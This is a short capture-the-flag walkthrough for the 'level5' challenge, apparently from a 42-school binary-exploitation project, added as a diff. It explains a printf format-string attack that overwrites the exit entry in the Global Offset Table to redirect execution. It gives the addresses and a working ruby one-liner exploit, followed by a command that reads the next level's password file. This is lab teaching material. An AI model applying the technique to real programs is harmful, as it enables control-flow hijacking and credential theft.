@@ -1,0 +1,26 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/24 16:46:41 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/24 17:11:15 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- like previous exploit we're going to take advantage printf bad use, but this
+time we will modify the Global Offset Table in order to call function o in place
+of exit
+
+- using objdump -R we can find exit entry in the GOT @ 0x08049838
+- using gdb we find o @ 0x080484a4 (134513828)
+
+- so, as usualy, we need to put target address at the beginning of str in order to
+reach it and rewrite the target through $n printf after having printed 134513828 bytes
+- printf param (str address) is 16 (4 x 4) bytes far from str, it can be seen as
+4th argument in printf argument list
+- we can now build our command
+	- (ruby -e 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat) | ./level5
+	- cat /home/user/level6/.pass
